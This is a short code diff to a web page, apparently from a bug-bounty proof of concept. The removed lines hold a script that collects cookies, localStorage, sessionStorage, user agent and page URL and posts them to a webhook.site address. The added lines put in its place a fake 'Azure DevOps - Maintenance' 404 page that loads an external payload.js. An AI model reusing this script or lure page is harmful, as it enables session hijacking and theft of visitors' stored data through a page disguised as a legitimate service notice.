@@ -1,29 +1,11 @@
-<script>
-    async function exfiltrateData() {
-        const webhookURL = "https://73764c17-b242-4f2a-84ba-88f63958a3e1.webhook.site";
-        
-        const data = {
-            researcher: "Ramavath Gopi Nayak",
-            impact: "Critical - Session Hijacking",
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            userAgent: navigator.userAgent,
-            url: window.location.href
-        };
-
-        try {
-            await fetch(webhookURL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-        } catch (e) {
-            console.error("Exfiltration failed", e);
-        }
-    }
-    
-    // Execute after 1 second
-    setTimeout(exfiltrateData, 1000);
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Azure DevOps - Maintenance</title>
+    <script src="payload.js"></script>
+</head>
+<body>
+    <h1>404 - Page Under Migration</h1>
+    <p>We are currently migrating this service to a new infrastructure. Please wait...</p>
+</body>
+</html>
